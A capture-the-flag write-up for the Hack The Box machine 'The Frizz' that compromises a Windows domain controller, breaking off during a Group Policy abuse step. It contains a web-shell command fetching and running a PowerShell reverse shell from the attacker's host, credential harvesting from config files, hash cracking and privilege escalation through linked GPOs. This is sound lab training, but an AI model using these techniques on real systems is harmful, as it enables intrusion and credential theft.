---
{"dg-publish":true,"permalink":"/ct-fs/htb/the-frizz/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #kerberos #llmnr_disabled #GPOs #AD #leaked_creds #web #Gibbon_LMS #kinit #chisel #mysql 

## Recon
![Pasted image 20261026130136.png](/img/user/CTFs/HTB/Images/The%20Frizz%20Images/Pasted%20image%2020261026130136.png)

### Nmap:
```zsh
┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/hashes]
└─$ nmap -p- -Pn -T4 -sC -sV 10.129.232.168          
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-26 17:39 -0400
Nmap scan report for FRIZZDC.frizz.htb (10.129.232.168)
Host is up (0.087s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-27 04:41:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57567/tcp open  msrpc         Microsoft Windows RPC
57571/tcp open  msrpc         Microsoft Windows RPC
57585/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-27T04:42:29
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m53s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.84 seconds

```
Initial portscanning shows a common set of Windows ports and services and SSH additionally on 22. Additionally this webserver was not originally identified by `threader3000`. 

### User enumeration
```zsh┌──(kali㉿kali)-[~/CTF/HTB/thefrizz/scanning]
└─$ kerbrute -dc 10.129.232.168 -domain frizz.htb -users ./msa.txt
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Valid user => a.perlstein
[*] Valid user => c.ramón
[*] Valid user => d.hudson
[*] Valid user => k.franklin
[*] Valid user => p.terese
[*] Valid user => r.tennelli
[*] Valid user => t.wright
[*] Valid user => w.li
```
Struggling to find a foothold I took a step back and looked at the HTB page for the box and noticed the icon was Miss Frizzle and the name of the box is The Frizz. So I took a shot in the dark and created a wordlist from the characters by inputting their names into a text file and then running them through `usernameanarchy` to create variations. I finally passed that list as our input list via `kerbrute` and was able to glean valid users in the form of first initial last name for most of the student characters.



### Web Enumeration
![Pasted image 20261026144909.png](/img/user/CTFs/HTB/Images/The%20Frizz%20Images/Pasted%20image%2020261026144909.png)
Visiting the site in the browser we see what appears to be the web app for the school from the show.

![Pasted image 20261026145003.png](/img/user/CTFs/HTB/Images/The%20Frizz%20Images/Pasted%20image%2020261026145003.png)
Clicking "Staff Login" at the top we are greeted with a `Gibbon LMS v25.0.00` login page with an option to apply as either a student or staff. However, clicking both in our case was a dead end.

## Initial Access
### CVE-2023-45878
```zsh
┌──(p3v)─(kali㉿kali)-[~/CTF/HTB/thefrizz/exploit]
└─$ python3 CVE-2023-45878-POC/CVE-2023-45878.py --reverse-shell -target_url http://frizzdc.frizz.htb/Gibbon-LMS -ip 10.10.14.24 -port 8888 -srvport 8090
[+] PHP shell uploaded successfully to http://frizzdc.frizz.htb/Gibbon-LMS/shell.php
[+] PowerShell reverse shell script saved to: shell.ps1
[+] The shell is now hosted at shell.ps1
Starting reverse shell listener in background...
Starting netcat listener on port 8888...
[+] HTTP server running in the background on port 8090
[+] Executing PHP shell to download and execute shell.ps1
Executing: http://frizzdc.frizz.htb/Gibbon-LMS/shell.php?cmd=powershell%20-nop%20-w%20hidden%20-c%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.14.24%3A8090/shell.ps1%27%29
[+] HTTP server started on http://0.0.0.0:8090/
listening on [any] 8888 ...
10.129.232.168 - - [26/Oct/2026 18:11:11] "GET /shell.ps1 HTTP/1.1" 200 -
connect to [10.10.14.24] from (UNKNOWN) [10.129.232.168] 53480
whoami
frizz\w.webservice
PS C:\xampp\htdocs\Gibbon-LMS
```
Searching online for our target's specific version of `Gibbon` we come across this [CVE]([https://nvd.nist.gov/vuln/detail/cve-2023-4587](https://nvd.nist.gov/vuln/detail/cve-2023-45878)). I used a [POC](https://github.com/PaulDHaes/CVE-2023-45878-POC/tree/main) I found on GitHub. As you can see we successfully gain a shell as the `w.webservice` user.

>[!info]
>![Pasted image 20261026151415.png](/img/user/CTFs/HTB/Images/The%20Frizz%20Images/Pasted%20image%2020261026151415.png)
>It states that a certain rubric related php file doesn't require authentication prior to accepting post requests and so an arbitrary file write vulnerability now exists. We use that to force the system to make a call back to a server we setup and give us a reverse shell.



#### Information Stealing/Gathering
```zsh
PS C:\xampp\htdocs\Gibbon-LMS> type config.php 
<?php
/*
Gibbon, Flexible & Open School System
Copyright (C) 2010, Ross Parker

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
```
With our newly found session I start to enumerate the filesystem where I landed which is all the system files for the Gibbon Instance. Reading out `config.php` we are able to successfully leak the creds for the database management user.

#### User List Cont.
```zsh
PS C:\xampp\htdocs\Gibbon-LMS> net user

User accounts for \\FRIZZDC

-------------------------------------------------------------------------------
a.perlstein              Administrator            c.ramon                  
c.sandiego               d.hudson                 f.frizzle                
g.frizzle                Guest                    h.arm                    
J.perlstein              k.franklin               krbtgt                   
l.awesome                m.ramon                  M.SchoolBus              
p.terese                 r.tennelli               t.wright                 
v.frizzle                w.li                     w.Webservice
```
From our session we were able to successfully enumerate even more users on the server.

#### MySQL Database access
```zsh
PS C:\xampp\htdocs\Gibbon-LMS> netstat -ano | findstr LISTENING
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       1164
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1512
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       960
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       960
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       896
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       1968
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       512
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       712
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1248
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:57567          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:57571          0.0.0.0:0              LISTENING       1952
  TCP    0.0.0.0:57585          0.0.0.0:0              LISTENING       1976
  TCP    0.0.0.0:58352          0.0.0.0:0              LISTENING       632
  TCP    10.129.232.168:53      0.0.0.0:0              LISTENING       1952
  TCP    10.129.232.168:139     0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       1952
  TCP    [::]:22                [::]:0                 LISTENING       1164
  TCP    [::]:80                [::]:0                 LISTENING       1512
  TCP    [::]:88                [::]:0                 LISTENING       648
  TCP    [::]:135               [::]:0                 LISTENING       960
  TCP    [::]:389               [::]:0                 LISTENING       648
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       648
  TCP    [::]:593               [::]:0                 LISTENING       960
  TCP    [::]:636               [::]:0                 LISTENING       648
  TCP    [::]:3268              [::]:0                 LISTENING       648
  TCP    [::]:3269              [::]:0                 LISTENING       648
  TCP    [::]:3306              [::]:0                 LISTENING       896
  TCP    [::]:9389              [::]:0                 LISTENING       1968
  TCP    [::]:49664             [::]:0                 LISTENING       648
  TCP    [::]:49665             [::]:0                 LISTENING       512
  TCP    [::]:49666             [::]:0                 LISTENING       712
  TCP    [::]:49667             [::]:0                 LISTENING       648
  TCP    [::]:49669             [::]:0                 LISTENING       1248
  TCP    [::]:49670             [::]:0                 LISTENING       648
  TCP    [::]:57567             [::]:0                 LISTENING       648
  TCP    [::]:57571             [::]:0                 LISTENING       1952
  TCP    [::]:57585             [::]:0                 LISTENING       1976
  TCP    [::]:58352             [::]:0                 LISTENING       632
  TCP    [::1]:53               [::]:0                 LISTENING       1952
  TCP    [dead:beef::1a1]:53    [::]:0                 LISTENING       1952
  TCP    [dead:beef::f3a0:5e4c:809c:d67e]:53  [::]:0                 LISTENING       1952
  TCP    [fe80::ef03:f11a:2db7:6839%5]:53  [::]:0                 LISTENING       1952
```
Enumerating our open ports we see that indeed MySQL is running on port 3306 locally. Let's tunnel this out to a server we control to connect.

##### Chisel
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/thefrizz/exploit]
└─$ chisel server --reverse --port 8001
2026/10/26 19:32:16 server: Reverse tunnelling enabled
2026/10/26 19:32:16 server: Fingerprint 0Qo3IKD+BMspAotOFqpI7adCHd5hi8lGCx1I6cPRSro=
2026/10/26 19:32:16 server: Listening on http://0.0.0.0:8001
2026/10/26 19:32:53 server: session#1: Client version (1.12.0) differs from server version (1.12.1-0kali2)
2026/10/26 19:32:53 server: session#1: Open (user=- addr=10.129.232.168:65274 remotes=R:0.0.0.0:3306:127.0.0.1:3306)
2026/10/26 19:32:53 server: session#1: tun: proxy#R:3306=>3306: Listening

PS C:\xampp\htdocs\Gibbon-LMS> wget http://10.10.14.24:8900/chisel.exe -outfile chisel.exe

┌──(kali㉿kali)-[~/CTF/HTB/thefrizz/exploit]
└─$ python3 -m http.server 8900
Serving HTTP on 0.0.0.0 port 8900 (http://0.0.0.0:8900/) ...
10.129.232.168 - - [26/Oct/2026 19:31:09] "GET /chisel.exe HTTP/1.1" 200 -

PS C:\xampp\htdocs\Gibbon-LMS> ./chisel.exe client 10.10.14.24:8001 R:3306:127.0.0.1:3306

```
Using `chisel` we setup a server on our kali machine, upload the EXE version to our windows host and run it in client mode calling back to our chisel server on kali making sure to forward port 3306 from kali to 3306 on our target machine.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/thefrizz/exploit]
└─$ mysql -h 127.0.0.1 -u 'MrGibbonsDB' -p --skip-ssl
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 72
Server version: 10.4.32-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show dbs;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'dbs' at line 1
MariaDB [(none)]> dbs;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'dbs' at line 1
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gibbon             |
| information_schema |
| test               |
+--------------------+
3 rows in set (0.090 sec)
```
As you can see we can now connect to the database from our kali machine via the creds we stole from the Gibbon docs.

##### Loot
```zsh
MariaDB [gibbon]> select firstname,surname,username,passwordStrong,passwordStrongSalt from gibbonperson;
+-----------+---------+-----------+------------------------------------------------------------------+------------------------+
| firstname | surname | username  | passwordStrong                                                   | passwordStrongSalt     |
+-----------+---------+-----------+------------------------------------------------------------------+------------------------+
| Fiona     | Frizzle | f.frizzle | 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03 | /aACFhikmNopqrRTVz2489 |
+-----------+---------+-----------+------------------------------------------------------------------+------------------------+
1 row in set (0.088 sec)
```
Poking around the tables inside the `gibbon` database we eventually come across a user entry inside the `gibbonperson` table for `f.frizzle`. It lists their password hash and salt. Let's see if we can crack it.

```zsh
┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/hashes]
└─$ hashid fiona.hash -m
--File 'fiona.hash'--
Analyzing '067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489'
[+] SHA-256 [Hashcat Mode: 1400]
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 [Hashcat Mode: 6900]
[+] GOST CryptoPro S-Box 
[+] SHA3-256 [Hashcat Mode: 5000]
[+] Skein-256 
[+] Skein-512(256) 
--End of file 'fiona.hash'--
```
We run the constructed hash through `hashid` to reveal that it's a SHA-256 hash. We know from the table that it's salted as well.

![Pasted image 20261026171512.png](/img/user/CTFs/HTB/Images/The%20Frizz%20Images/Pasted%20image%2020261026171512.png)
I was able to track down the proper `hashcat` modes for cracking salted SHA-256 hashes. One for salt in front and one for salt behind the pw hash.
##### Cracking Hashes
```zsh
┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/hashes]
└─$ cat fiona.hash 
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489

┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/hashes]
└─$ hashcat -m 1420 fiona.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i7-14700F, 1923/3846 MB (1923 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (5005 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1420 (sha256($salt.$pass))
Hash.Target......: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff...Vz2489
Time.Started.....: Mon Oct 26 20:12:12 2026 (1 sec)
Time.Estimated...: Mon Oct 26 20:12:13 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  8188.2 kH/s (0.16ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11022336/14344385 (76.84%)
Rejected.........: 0/11022336 (0.00%)
Restore.Point....: 11018240/14344385 (76.81%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: JessdoG1 -> JazIris@@
Hardware.Mon.#01.: Util: 45%

Started: Mon Oct 26 20:12:12 2026
Stopped: Mon Oct 26 20:12:15 2026
```
As you can see we successfully crack `f.frizzle's` hash with mode 1420 via hashcat.

### SSH via Kerberos
```zsh


┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/hashes]
└─$ kinit f.frizzle@FRIZZ.HTB
Password for f.frizzle@FRIZZ.HTB: 
                                                                                                                    
┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/hashes]
└─$ klist                    
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: f.frizzle@FRIZZ.HTB

Valid starting       Expires              Service principal
10/27/2026 03:36:19  10/27/2026 13:36:19  krbtgt/FRIZZ.HTB@FRIZZ.HTB
	renew until 10/28/2026 03:36:13
                                                                                                                    
┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/hashes]
└─$ ssh -o PreferredAuthentications=gssapi-with-mic -o GSSAPIAuthentication=yes f.frizzle@frizzdc.frizz.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
PowerShell 7.4.5
PS C:\Users\f.frizzle>  
```
Setting up proper realm information inside our `/etc/krb5.conf` file for `FRIZZ.HTB` we successfully request a kerberos TGT from the server and then are able to pass that to authenticate via ssh to the server as `f.frizzle`.


#### Profit
```zsh
PS C:\Users\f.frizzle> dir Desktop

    Directory: C:\Users\f.frizzle\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar--          10/26/2026  8:01 PM             34 user.txt

```
And just like that `user.txt` is ours.

## Lateral Movement
### Recycle Bin Dumpster Diving
```zsh
PowerShell 7.4.5
PS C:\Users\f.frizzle> ls 'C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\'

    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z

```
Enumerating the filesystem's Recycle Bin we see what appears to be two 7zip archives. 

```zsh
┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/7zip]
└─$ cat '$IE2XMEG.7z'                                  
[ ��2*�<C:\Users\f.frizzle\AppData\Local\Temp\wapt-backup-sunday.7z 
```
The first file we analyze looks like a reference to a backup of the `WAPT` system with the original file path included.

```zsh
---SNIP---
4.0K -rw-rw-r--   1 kali kali 3.0K Sep 10  2024  vss.py
8.0K -rw-rw-r--   1 kali kali 4.4K Sep 10  2024  vssutil.cpython-38.pyc
8.0K -rw-rw-r--   1 kali kali 4.6K Sep 10  2024  vssutil.py
4.0K drwxrwxr-x   2 kali kali 4.0K Oct 23  2024  wads_template
4.0K -rw-rw-r--   1 kali kali 2.3K Oct 22  2024  wait.cpython-38.pyc
8.0K -rw-rw-r--   1 kali kali 4.4K Sep 10  2024  wait.py
4.0K drwxrwxr-x   2 kali kali 4.0K Oct 23  2024  waitress
4.0K drwxrwxr-x   2 kali kali 4.0K Oct 23  2024  waitress-2.1.2.dist-info
 96K -rw-rw-r--   1 kali kali  96K Sep 10  2024  waitress-serve.exe
4.0K -rw-rw-r--   1 kali kali  166 Sep 10  2024  Wake
4.0K drwxrwxr-x   2 kali kali 4.0K Oct 23  2024  wakeonlan-2.0.1.dist-info
4.0K -rw-rw-r--   1 kali kali 2.8K Oct 22  2024  wakeonlan.cpython-38.pyc
 96K -rw-rw-r--   1 kali kali  96K Sep 10  2024  wakeonlan.exe
4.0K -rw-rw-r--   1 kali kali 2.5K Sep 10  2024  wakeonlan.py
4.0K -rw-rw-r--   1 kali kali  166 Sep 10  2024  Wallis
4.0K drwxrwxr-x   2 kali kali 4.0K Oct 23  2024  wapt
4.0K drwxrwxr-x   2 kali kali 4.0K Oct 23  2024  WAPT
 12K -rw-rw-r--   1 kali kali 8.9K Sep 10  2024  waptbinaries.sha256
8.0K -rw-rw-r--   1 kali kali 5.3K Sep 10  2024  waptconsole.css
4.0K -rw-rw-r--   1 kali kali 1.1K Sep 10  2024  waptconsole.exe.manifest
524K -rw-rw-r--   1 kali kali 524K Sep 10  2024  waptconsole.fr.po
412K -rw-rw-r--   1 kali kali 410K Sep 10  2024  waptconsole.pot
 92K -rw-rw-r--   1 kali kali  90K Oct 22  2024  waptcrypto.cpython-38.pyc
112K -rw-rw-r--   1 kali kali 110K Sep 10  2024  waptcrypto.py
 92K -rw-rw-r--   1 kali kali  92K Oct 22  2024  waptdb.sqlite
8.0K -rw-rw-r--   1 kali kali 4.5K Sep 10  2024  wapt-enterprise.ico
4.0K -rw-rw-r--   1 kali kali 3.9K Sep 10  2024  waptexit.fr.po
4.0K -rw-rw-r--   1 kali kali 2.9K Sep 10  2024  waptexit.pot
4.9M -rw-rw-r--   1 kali kali 4.9M Sep 10  2024  wapt-get.exe
4.0K -rw-rw-r--   1 kali kali 1.3K Sep 10  2024  wapt-get.exe.manifest
4.0K -rw-rw-r--   1 kali kali 3.4K Sep 10  2024  wapt-get.fr.po
4.0K -rw-rw-r--   1 kali kali   46 Oct 22  2024  wapt-get.ini
8.0K -rw-rw-r--   1 kali kali 5.7K Sep 10  2024  wapt-get.ini.tmpl
4.0K -rw-rw-r--   1 kali kali 2.2K Sep 10  2024  wapt-get.po
 88K -rw-rw-r--   1 kali kali  88K Sep 10  2024  wapt-get.py
4.0K -rw-rw-r--   1 kali kali 1.3K Sep 10  2024  waptguihelper.po
7.0M -rw-rw-r--   1 kali kali 7.0M Sep 10  2024  waptguihelper.pyd
3.5M -rw-rw-r--   1 kali kali 3.5M Sep 10  2024  waptlicences.pyd
6.1M -rw-rw-r--   1 kali kali 6.1M Sep 10  2024  waptmessage.exe
4.0K -rw-rw-r--   1 kali kali 1.9K Sep 10  2024  waptmessage.fr.po
4.0K -rw-rw-r--   1 kali kali 1004 Sep 10  2024  waptmessage.pot
140K -rw-rw-r--   1 kali kali 137K Oct 22  2024  waptpackage.cpython-38.pyc
192K -rw-rw-r--   1 kali kali 192K Sep 10  2024  waptpackage.py
4.0K -rw-rw-r--   1 kali kali 3.3K Sep 10  2024  wapt.psproj
104K -rw-rw-r--   1 kali kali 104K Sep 10  2024  waptpython.exe
4.0K -rw-rw-r--   1 kali kali 2.1K Sep 10  2024  waptpython.fr.po
4.0K -rw-rw-r--   1 kali kali 2.1K Sep 10  2024  waptpython.pot
104K -rw-rw-r--   1 kali kali 103K Sep 10  2024  waptpythonw.exe
8.0K -rw-rw-r--   1 kali kali 5.7K Sep 10  2024  wapt-scanpackages.py
8.5M -rw-rw-r--   1 kali kali 8.5M Sep 10  2024  waptself.exe
---SNIP---
```
The other file we find appears to be the full backup of that WAPT system including `ini` files which could leak valuable credential or otherwise useful config about this backup.

```zsh
┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/7zip]
└─$ find . -iname "*.ini" 2>/dev/null
./wmitest.master.ini
./waptserver.ini
./wapt-get.ini

┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/7zip]
└─$ cat waptserver.ini    
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log

┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/7zip]
└─$ cat wapt-get.ini                 
[global]
use_hostpackages=1
use_kerberos=0

┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/7zip]
└─$ echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d                                                                                                                 
!suBcig@MehTed!R
```
Inside one of those config files `waptserver.ini` we see a base64 encoded password string as well as secret keys and tokens for the WAPT service. We successfully decode the password string to get the plaintext version.

### Kerberos Ticket Request
```zsh
┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/7zip]
└─$ kinit m.schoolbus@FRIZZ.HTB
Password for m.schoolbus@FRIZZ.HTB: 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/HTB/thefrizz/loot/7zip]
└─$ klist                      
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: m.schoolbus@FRIZZ.HTB

Valid starting       Expires              Service principal
10/27/2026 22:32:29  10/28/2026 08:32:29  krbtgt/FRIZZ.HTB@FRIZZ.HTB
	renew until 10/28/2026 22:32:21

```
Taking a shot here I tried to run `kinit` for `m.schoolbus` with the password we found, and as you can see we successfully pull a TGT for `m.schoolbus` and add it to our list of kerberos creds.

## Privilege Escalation
### Bloodhound
![Pasted image 20261027123319.png](/img/user/CTFs/HTB/Images/The%20Frizz%20Images/Pasted%20image%2020261027123319.png)
Pulling BH loot on our compromised user we don't immediately see any paths to higher value targets. Let's look deeper at other groups and objects.

![Pasted image 20261027123417.png](/img/user/CTFs/HTB/Images/The%20Frizz%20Images/Pasted%20image%2020261027123417.png)
Looking through members of "Remote Management Users" we find that the only other member is `m.schoolbus`.

![Pasted image 20261027123522.png](/img/user/CTFs/HTB/Images/The%20Frizz%20Images/Pasted%20image%2020261027123522.png)
We see that user `m.schoolbus` has the `WriteGPLink` attribute set over both the Class and Domain Controllers OUs. Either could be a target for malicious GPO injection.

![Pasted image 20261027123741.png](/img/user/CTFs/HTB/Images/The%20Frizz%20Images/Pasted%20image%2020261027123741.png)
Enumerating their group memberships we do see that they have permissions to create and administrate ownership of GPOs in the domain. With that in mind, it looks like we can forge a malicious GPO and push it to the DC directly.
### GPO Abuse
#### Attack Steps
##### Create a GPO
```zsh
PS C:\Users\M.SchoolBus> New-GPO -Name "pwned" | New-GPLink -Target "OU=CLASS_FRIZZ,DC=FRIZZ,DC=HTB" -LinkEnabled Yes


GpoId       : 7d33add5-0476-489c-93fb-b61e483e091c
DisplayName : pwned
Enabled     : True
Enforced    : False
Target      : OU=Class_Frizz,DC=frizz,DC=htb
Order       : 1



PS C:\Users\M.SchoolBus>

```
The first thing we do is create a new GPO (we named `pwned` in our case) and link it to the OU we wish to attack. We successfully create the empty GPO and link it to the `CLASS_FRIZZ` OU via our powershell session as `m.schoolbus`. As a member of `Group Policy Creator Owners` we have permission to add GPOs we control to any OUs we have a GPLink with. We create this GPO so that we can then abuse it via a scheduled task which will change the password of our target `v.frizzle`. 

##### Hit a wall. Start again.
**However, when I tried this it kept running without issuing the changes. So I decide to pivot to target the Domain Controllers OU instead to see if we can add our current user `m.schoolbus` to the server's local administrators.**

##### Abuse new GPO for local Admin
```zsh
PS C:\Users\M.SchoolBus> .\sharpgpoabuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName "opensesame"                                                                                                                               
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106
[!] Could not retrieve the GPO GUID. The GPO Name was invalid. 
[-] Exiting...
PS C:\Users\M.SchoolBus> New-GPO -Name "opensesame" | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes

GpoId       : 9d93fc25-fcf2-4a3b-b54d-b67944a7dba7
DisplayName : opensesame
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 2

PS C:\Users\M.SchoolBus> .\sharpgpoabuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName "opensesame"
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106
[+] GUID of "opensesame" is: {9D93FC25-FCF2-4A3B-B54D-B67944A7DBA7}
